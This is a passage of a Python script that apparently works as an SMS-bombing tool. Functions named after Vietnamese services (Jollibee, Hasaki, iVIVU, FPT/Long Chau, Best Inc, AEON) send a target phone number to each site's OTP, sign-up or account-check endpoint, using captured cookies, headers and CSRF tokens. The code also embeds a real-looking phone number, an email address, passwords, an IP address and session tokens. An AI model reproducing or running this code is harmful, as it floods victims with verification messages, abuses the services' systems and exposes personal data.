    'duo_theme_json': '{"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":null,"holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://xcdn-cf.vuihoc.vn/assets/duo/theme/tet/2025/web/cdn-tet-animation-flower-big.js","start_time":"2025-01-15 00:00:00","end_time":"2025-02-09 23:59:59"}',
    '_gid': 'GA1.2.964259439.1746086828',
    '_ga': 'GA1.2.838406960.1746086828',
    '_ga_PR7QKZ61KC': 'GS1.1.1746086827.1.1.1746086867.0.0.0',
    '_ga_4BW81DWTX0': 'GS1.1.1746086831.1.1.1746086906.60.0.0',
    'number_auth': phone,
}

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'priority': 'u=0, i',
    'referer': 'https://vuihoc.vn/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # 'cookie': 'VERSION=1; WEB_LOP=1; duo_theme_json={"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":null,"holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://xcdn-cf.vuihoc.vn/assets/duo/theme/tet/2025/web/cdn-tet-animation-flower-big.js","start_time":"2025-01-15 00:00:00","end_time":"2025-02-09 23:59:59"}; _gid=GA1.2.964259439.1746086828; _ga=GA1.2.838406960.1746086828; _ga_PR7QKZ61KC=GS1.1.1746086827.1.1.1746086867.0.0.0; _ga_4BW81DWTX0=GS1.1.1746086831.1.1.1746086906.60.0.0; number_auth=0328396649',
}

    params = {
    'typeOTP': '1',
}

    response = requests.get('https://vuihoc.vn/user/verifyAccountkitSMS', params=params, cookies=cookies, headers=headers)
def jlb(phone):
    cookies = {
    'PHPSESSID': 'n6ogvgqd00iulfaqd2jl8v9i30',
    '_fbp': 'fb.2.1746087278781.495652816758712724',
    '_gid': 'GA1.3.2003033383.1746087280',
    '_gat_gtag_UA_191456349_1': '1',
    '_gat_UA-191456349-19': '1',
    '_tt_enable_cookie': '1',
    '_ttp': '01JT5EK06DFBD5SFHFAK9HAKME_.tt.2',
    'form_key': '8YtkmRHuctVgGAp5',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'form_key': '8YtkmRHuctVgGAp5',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'csp': '1',
    'csd': '1',
    '_ga_7QF2M4198R': 'GS1.1.1746087280.1.1.1746087301.39.0.0',
    '_ga': 'GA1.1.1286653773.1746087280',
    '_ga_G92EK3GZLQ': 'GS1.1.1746087280.1.1.1746087301.39.0.0',
    '_ga_JCDZDB6J2V': 'GS1.1.1746087280.1.1.1746087301.39.0.0',
    'ttcsid': '1746087280848::Ise0nalnN7N1Tk4dhSFJ.1.1746087302225',
    'private_content_version': '179ae7ebed54af08ac9364490e7e90ca',
    '_ga_CQTVGTWHFF': 'GS1.1.1746087280.1.1.1746087303.37.0.833631266',
    'ttcsid_CNLBDVBC77U4TBB0R76G': '1746087280849::Ha2B992hX7D9poX61DX3.1.1746087336206',
    'ttcsid_CMRLVARC77U705JG557G': '1746087280848::z1UMToQJf7dUHENS-dt-.1.1746087336206',
    'section_data_ids': '%7B%22amfacebook-pixel%22%3A1746088301%2C%22notification_count%22%3A1746088301%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1746088301%2C%22cart%22%3A1746088301%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22product_area_price%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
    '_gcl_au': '1.1.1492290555.1746087279.1755608923.1746087336.1746087336',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://jollibee.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://jollibee.com.vn/customer/account/create/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    # 'cookie': 'PHPSESSID=n6ogvgqd00iulfaqd2jl8v9i30; _fbp=fb.2.1746087278781.495652816758712724; _gid=GA1.3.2003033383.1746087280; _gat_gtag_UA_191456349_1=1; _gat_UA-191456349-19=1; _tt_enable_cookie=1; _ttp=01JT5EK06DFBD5SFHFAK9HAKME_.tt.2; form_key=8YtkmRHuctVgGAp5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=8YtkmRHuctVgGAp5; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; csp=1; csd=1; _ga_7QF2M4198R=GS1.1.1746087280.1.1.1746087301.39.0.0; _ga=GA1.1.1286653773.1746087280; _ga_G92EK3GZLQ=GS1.1.1746087280.1.1.1746087301.39.0.0; _ga_JCDZDB6J2V=GS1.1.1746087280.1.1.1746087301.39.0.0; ttcsid=1746087280848::Ise0nalnN7N1Tk4dhSFJ.1.1746087302225; private_content_version=179ae7ebed54af08ac9364490e7e90ca; _ga_CQTVGTWHFF=GS1.1.1746087280.1.1.1746087303.37.0.833631266; ttcsid_CNLBDVBC77U4TBB0R76G=1746087280849::Ha2B992hX7D9poX61DX3.1.1746087336206; ttcsid_CMRLVARC77U705JG557G=1746087280848::z1UMToQJf7dUHENS-dt-.1.1746087336206; section_data_ids=%7B%22amfacebook-pixel%22%3A1746088301%2C%22notification_count%22%3A1746088301%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1746088301%2C%22cart%22%3A1746088301%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22product_area_price%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D; _gcl_au=1.1.1492290555.1746087279.1755608923.1746087336.1746087336',
}

    data = {
    'form_key': '8YtkmRHuctVgGAp5',
    'success_url': '',
    'error_url': '',
    'lastname': 'da',
    'firstname': 'asdas',
    'phone': phone,
    'email': 'mfcisneros78@gmail.com',
    'password': 'jXAcb@Zp6aYd7n2',
    'password_confirmation': 'jXAcb@Zp6aYd7n2',
    'dob': '10/04/1991',
    'gender': '1',
    'province_customer': '18',
    'agreement': '1',
    'is_subscribed': '1',
    'otp_type': 'create',
    'ip': '171.236.58.142',
}

    response = requests.post('https://jollibee.com.vn/otp/action/getOTP', cookies=cookies, headers=headers, data=data)
def hasaki(phone):
    cookies = {
    'sessionChecked': '1746087639',
    'HASAKI_SESSID': 'dec976bd683a330d5a80838c08320242',
    'form_key': 'dec976bd683a330d5a80838c08320242',
    'utm_hsk': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%221909359775%22%2C%22utm_term%22%3Anull%7D',
    'PHPSESSID': '7kql08fft0umqk0tc7qd4leni4',
    '_gid': 'GA1.2.2026558365.1746087643',
    '_gac_UA-79166816-1': '1.1746087643.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB',
    '_gcl_gs': '2.1.k1$i1746087640$u140347050',
    '_gcl_au': '1.1.929131664.1746087643',
    '__uidac': '0168132edaf57914ade4602e1af3ebc2',
    '__admUTMtime': '1746087642',
    '_gat': '1',
    '_fbp': 'fb.1.1746087643123.685803566580988685',
    '_tt_enable_cookie': '1',
    '_ttp': '01JT5EY2D888RE96AAAZHP626H_.tt.1',
    'ttcsid': '1746087643623::kmH7UfsmFsD2vpXzx_Dw.1.1746087643623',
    '_gcl_aw': 'GCL.1746087644.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB',
    '_ga': 'GA1.1.275318713.1746087643',
    '_ga_MMWZXZ1JWH': 'GS1.2.1746087644.1.0.1746087644.60.0.0',
    '__utm': 'source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880',
    '__utm': 'source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880',
    '__iid': '7895',
    '__iid': '7895',
    '__su': '0',
    '__su': '0',
    '__RC': '25',
    '__R': '1',
    '__uif': '__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338',
    '_ga_40EJN12JB0': 'GS1.1.1746087643.1.0.1746087656.47.0.0',
    '_ga_T2KJ07X20R': 'GS1.1.1746087643.1.0.1746087656.0.0.0',
    'ttcsid_C6BJ3UMDUP8O9FFUQ110': '1746087643622::srdvwe52wmR7yG5m18A-.1.1746087682247',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'priority': 'u=1, i',
    'referer': 'https://hasaki.vn/san-pham-ban-chay.html?utm_source=google&utm_medium=cpc&utm_campaign=1909359775&utm_content=148173209880&product_id={productid}&item_id={itemid}&gad_source=1&gad_campaignid=1909359775&gbraid=0AAAAACw4VS0PXIzMTklEXSGzTgbEC-F2U&gclid=Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    # 'cookie': 'sessionChecked=1746087639; HASAKI_SESSID=dec976bd683a330d5a80838c08320242; form_key=dec976bd683a330d5a80838c08320242; utm_hsk=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%221909359775%22%2C%22utm_term%22%3Anull%7D; PHPSESSID=7kql08fft0umqk0tc7qd4leni4; _gid=GA1.2.2026558365.1746087643; _gac_UA-79166816-1=1.1746087643.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB; _gcl_gs=2.1.k1$i1746087640$u140347050; _gcl_au=1.1.929131664.1746087643; __uidac=0168132edaf57914ade4602e1af3ebc2; __admUTMtime=1746087642; _gat=1; _fbp=fb.1.1746087643123.685803566580988685; _tt_enable_cookie=1; _ttp=01JT5EY2D888RE96AAAZHP626H_.tt.1; ttcsid=1746087643623::kmH7UfsmFsD2vpXzx_Dw.1.1746087643623; _gcl_aw=GCL.1746087644.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB; _ga=GA1.1.275318713.1746087643; _ga_MMWZXZ1JWH=GS1.2.1746087644.1.0.1746087644.60.0.0; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __iid=7895; __iid=7895; __su=0; __su=0; __RC=25; __R=1; __uif=__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338; _ga_40EJN12JB0=GS1.1.1746087643.1.0.1746087656.47.0.0; _ga_T2KJ07X20R=GS1.1.1746087643.1.0.1746087656.0.0.0; ttcsid_C6BJ3UMDUP8O9FFUQ110=1746087643622::srdvwe52wmR7yG5m18A-.1.1746087682247',
}

    params = {
    'api': 'user.verifyUserName',
    'username': phone,
}

    response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
def ivivu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'content-type': 'application/json',
    'origin': 'https://member.ivivu.com',
    'priority': 'u=1, i',
    'referer': 'https://member.ivivu.com/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

    json_data = {
    'fullName': 'duc tyuyen',
    'email': phone,
    'password': 'asdasdasdsadraww34q3A',
    'recaptchaToken': '03AFcWeA5gsMmlSeYH_cs9WrMrVUG4K67PiSjCr6zVJ3NAhaOw_V48etWHedavhZucFLaFWNI8NIavbLj3CpkS93SNxbrPkKCdeYrOUEmYrZtw-eC7Ebg_TOawnVNzTrWZaxhjSDmQ-htH76HNhjI42HaiBq5a8MPzLpcm6etKC0aJQV_Qls3c_dI5kbYUmKuLDTTYR5QwDnndy7JmvGHxAKBTZnwS2wun2U5psVSAmJmK1I55z6IoMSIVUc1lTrCkL10m02MrILOqeGRmtxjFVV7zSPTmL9KhILavheFwd0Z12-PFTwE3MFp1qIHLpmQ3-uAH32rV9aa1vEzfPGKWheE9u5VO6dzvGDmwLu3pxP_b_jDKKjVqmH8KaOO4SX9Qh-lgwCndSBcbcHtHmqfzhM7M7zol2bGi7XDHvY9Lxjo66ZxZeb7p4u_UktijQGccrzEmQnysD1U4qv9pfQpwWhEqvXfTWe5l1w_EISX6DYyZpzTgDi5SvnIDgsbYzDRODONh1ZKWNgQLLVFUvpDFwirDovaaDUSKnLcB5TA_O339CDBnSgy4-Cc4QOCQ6H99tqUfqGsH80e95kOnGzjnVYI4vO1tJ_IhX6Z2yhLUV2lcKpvBNmQ7qatT_DoOJDA_P9Sk1jpivNvzRBMMmHxSV8F1fXqqP0OeQ1L4l0ZjOpb_aUSK46TiKWraqLwPgS3c2NqQthtwwUJqmNc32L0qqPWq7qjw7wiWRS-DCz-y2NAE6f5mIc0Jr5-DWyfQPan9q-NdVjRoQ622o-qm__3f1zD8X4OqYFkwkbCdoIPPYAG3_JT6qExKSI0Oz4bZ7OQcj1i9RUysWUVcUOv7sh9GqfMhNCNIjnI7370esGJPuvo2wV5kuRf6j4LbJ6ARu6Nmgwxr_nzCfDIyN09efNYY6t6n4ELp61uLhqIaOcQdr-uL3cTRUzpO98Hi-bc-_ypiVdyCVLHGbNA5SQS90d3zMI2gwrrUyFYd_Q2uYXOURqxcrOvQq86YgHY4b4HfOmev0cz9FUaXbQG0BDX4EW5Cyy9QGeyL_NEsiJty-37dHbg0xH6Hn_6vvp-7mQ4-JCH9tuQbycPxzB_Rvd9MPUksRw1fFsKKCWmEru5MogCoFcmcQSc4FsyMzkETGmV518vw3KoR2s6Igyp9PJ1abnybyz90qdYGIaxo9-46h8-rN8G_23CZ02zbLSQDmYyIyHqbMc3ws1osXSeyxcRK75ZDSrJsOB1FeJLAXE86bWhB7k5MgXm1myZBah_fqjMXE-W148_Uk2fF11Fjwn0pPnDxMcHDuNYmdpcNu2ZKy6HmvaTWz7sEg30rcJtiZfWntCKGcpEWrRhldsYZsAakbIcXNefTgMmT4QkcwSWV7hEl4qXw3Mys4muzJe7eN1s3ohilUj3pCKKCyB2UGBemIEeBmNMPf2jf7Pas3YXdC6QrzNeskrYInkB4xaUw_eHmtOlIMNRXAIat5u-eTkq1ml4de6CvhdYSRZVA4N1synTgbk82Fd_Md_aBP9S4y2KR1zY8jOZsQOs5psbQy_nogASsb_FclCF-r75uyA4djuiIXNQG6yRuj58DzFMhBBgdinTkVZJCN5NEJnpLzOtq2o_p98E3G0Bo9Dy-PsU09xYEQiGrX9FXADR_E3FtFq_mV4w-7nkVaUh48ed2I9riQ2Huvlydz_4qc1jem1UJBV4t-y8MuCTxlHQgLFBEE6q0PbWAwiBnaDDXoS6YtjAD0u_NtRl26xCUH5Paf-rg6eVsgIgg0P6dS8Wxpbwd6tR-28V0wPhB1xhrMsWzVvv96YnsfPFqXqokn-1X5AxVV1rSvYjcy99XXmWDL7BBRRK1irq8QKnF6gayw6_QAcNhGgbHP2wko8BQe8miBHX6OcWsb2wEvur3Q5IGd0jUETHowQEumMJKaZ4G28fhXmn5tDmSbyPPlp8QuoavqGQg7zgZGAKMsS55FdcBwRQjT2JFrUy9_D24nCxiMRC_R--NdgfL6oh_Oqiti2KLG3dXKN4GHw69PG0DLwvdOpbP15u3Z4tw5_EmRl16gcJdfzhR4V9K1MLIxwDDGjhijiexpvcu73WmpEPVu2EUTBpHUMIVdjKJ0jhG77wDd9k1p3tzDyWmItA1SjuIA9lRcA',
}

    response = requests.post('https://apiportal.ivivu.com/api/account/registerV2', headers=headers, json=json_data)
def longchau(phone):
    cookies = {
    'INGRESSCOOKIE': '1746088485.227.58.68199|7fba285e5548cf27d0d7a70b981762e8',
    'fptid-antiforgery': 'CfDJ8K4dvrnRzclGrO7gfc8sD9IddKcCAZpL54MFemo4XRkStnnkfTxGJEUNmV1eHDYy8sLWasM3qJNhNXe9B0o9byi9cY4MZC8cHKVeH07idba6G-2ojiGMHBvyVM-bJ85OGyH4jYq0KiI_n3A_INqB90Q',
    'oauth2_authentication_csrf_insecure': 'MTc0NjA4ODQ4NHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJREptTjJRMFkyWTJZekF6TnpRMVkySTVObVl3WmprMU9HUXdORGxtTjJaa3zbSH9D-F1TULGXBnJd-HaTxl7msvJ3SsbznQSNhuVwaQ==',
    'fptid-session': 'CfDJ8K4dvrnRzclGrO7gfc8sD9LCgIPrcRWWONgq8z5DlCh6nMjqXc4nICN9fBvL3v8SdKrAJegeZwYJ%2FzLrp6%2FZFpXfrTtDhauGZhnyJUL3SE8HYhySn7oGyfIKJ%2Frpv%2BG%2BGc4csXirkBb8sBvbBjKkz6UqesYWyuM8U34bDPMSTbm6',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://accounts.fpt.vn',
    'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=06e34accbbb446b1ae6da0c4d36f488a',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'X-CSRF-TOKEN': 'CfDJ8K4dvrnRzclGrO7gfc8sD9LqeoIUzwPygMCsNOsju5531ldlDxB_6dXRmXoXMwHbaorvEoU7PMxHXuxk4w32PcGdQjYpn1oXkgDpVcyvXIJGCCIqmtGJQi8HHVsejwpoywazkxJBgVN63JikHlbHE4Q',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': 'INGRESSCOOKIE=1746088485.227.58.68199|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8K4dvrnRzclGrO7gfc8sD9IddKcCAZpL54MFemo4XRkStnnkfTxGJEUNmV1eHDYy8sLWasM3qJNhNXe9B0o9byi9cY4MZC8cHKVeH07idba6G-2ojiGMHBvyVM-bJ85OGyH4jYq0KiI_n3A_INqB90Q; oauth2_authentication_csrf_insecure=MTc0NjA4ODQ4NHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJREptTjJRMFkyWTJZekF6TnpRMVkySTVObVl3WmprMU9HUXdORGxtTjJaa3zbSH9D-F1TULGXBnJd-HaTxl7msvJ3SsbznQSNhuVwaQ==; fptid-session=CfDJ8K4dvrnRzclGrO7gfc8sD9LCgIPrcRWWONgq8z5DlCh6nMjqXc4nICN9fBvL3v8SdKrAJegeZwYJ%2FzLrp6%2FZFpXfrTtDhauGZhnyJUL3SE8HYhySn7oGyfIKJ%2Frpv%2BG%2BGc4csXirkBb8sBvbBjKkz6UqesYWyuM8U34bDPMSTbm6',
}

    json_data = {
    'Username': phone,
    'Challenge': '06e34accbbb446b1ae6da0c4d36f488a',
}

    response = requests.post('https://accounts.fpt.vn/sso/partial/username', cookies=cookies, headers=headers, json=json_data)
def inc(phone):
    headers = {
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '-7',
}

    params = {
    'code': '30194b18b0cef05ea25dfd04cd2a61ac',
    'instanceId': '50ea502c-c44f-4f5e-b8ac-16c051767b83',
    'validate': 'cf890f76ea99fb13037dab9267e64d49',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
def eaone(phone):
    cookies = {
    'crumb': 'AfT5jHZE-xLDuRqM8Y-OIPriyak8lYif5LdMd1H6agU',
    'deviceId': 'bc7ccfa3-0e31-4576-b08a-3c5c125b2b28',
    'i18next': 'vi-VN',
    '_gcl_au': '1.1.1576847938.1746105354',
    '_ga': 'GA1.1.320500299.1746105355',
    '_ym_uid': '1746105359521230216',
    '_ym_d': '1746105359',
    '_fbp': 'fb.1.1746105361243.627593510266440100',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
    'locationIdentifierIds': '6476ec02b597582eddf08b8d',
    'selectedCity': 'T%E1%BB%89nh%20B%E1%BA%AFc%20Ninh',
    'selectedDistrict': 'Huy%E1%BB%87n%20L%C6%B0%C6%A1ng%20T%C3%A0i',
    'selectedWard': 'X%C3%A3%20Tr%E1%BB%ABng%20X%C3%A1',
    'locationCaptured': 'true',
    'aeon-vn-prodnxweb.sid': 'Fe26.2**770e5699ebeb007bef7922be131e0b32b59b9b923807b2ee6e89b17a003eb769*ghl94JZ3bRmV1TT1OwEoBw*Yf9h0XooqJ9HBJ3TZkxSEyzJonywAeVOCJPlCPCoHGE7bLQQeMj6juSS1cVAwtel**a68648d8d50ed16ec5f82a6012d04077ac1d59100fe081c4be8ae88c3c4f8feb*NNMI7lKB69ZiL0d1G1Jm7yGfoD8hVzdabIo5_gu7Fsc',
    'superSession': '{%22id%22:%22bc7ccfa3-0e31-4576-b08a-3c5c125b2b28-1746105355266%22%2C%22expiry%22:1746107179692}',
    'datadome': '~Z7aIPPlC7sJ2s~w0BCabsOzW8pYVnoPq7AiFtso~ZJmbE9ulZgAfPAhShabOCJBOLCzl1yPVRm99rpP7uP40DfD9~w8ONq2AblGVj7kIODKUTQHPM6ti6Ol~GrZZjql',
    '_ga_DSESGQJZC8': 'GS1.1.1746105355.1.1.1746105410.5.0.0',
    '_dd_s': 'rum=0&expire=1746106318905',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'api-json': 'true',
    'content-type': 'application/json',
    'origin': 'https://aeoneshop.com',
    'priority': 'u=1, i',
    'referer': 'https://aeoneshop.com/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-csrf-token': 'AfT5jHZE-xLDuRqM8Y-OIPriyak8lYif5LdMd1H6agU',
    # 'cookie': 'crumb=AfT5jHZE-xLDuRqM8Y-OIPriyak8lYif5LdMd1H6agU; deviceId=bc7ccfa3-0e31-4576-b08a-3c5c125b2b28; i18next=vi-VN; _gcl_au=1.1.1576847938.1746105354; _ga=GA1.1.320500299.1746105355; _ym_uid=1746105359521230216; _ym_d=1746105359; _fbp=fb.1.1746105361243.627593510266440100; _ym_isad=2; _ym_visorc=w; locationIdentifierIds=6476ec02b597582eddf08b8d; selectedCity=T%E1%BB%89nh%20B%E1%BA%AFc%20Ninh; selectedDistrict=Huy%E1%BB%87n%20L%C6%B0%C6%A1ng%20T%C3%A0i; selectedWard=X%C3%A3%20Tr%E1%BB%ABng%20X%C3%A1; locationCaptured=true; aeon-vn-prodnxweb.sid=Fe26.2**770e5699ebeb007bef7922be131e0b32b59b9b923807b2ee6e89b17a003eb769*ghl94JZ3bRmV1TT1OwEoBw*Yf9h0XooqJ9HBJ3TZkxSEyzJonywAeVOCJPlCPCoHGE7bLQQeMj6juSS1cVAwtel**a68648d8d50ed16ec5f82a6012d04077ac1d59100fe081c4be8ae88c3c4f8feb*NNMI7lKB69ZiL0d1G1Jm7yGfoD8hVzdabIo5_gu7Fsc; superSession={%22id%22:%22bc7ccfa3-0e31-4576-b08a-3c5c125b2b28-1746105355266%22%2C%22expiry%22:1746107179692}; 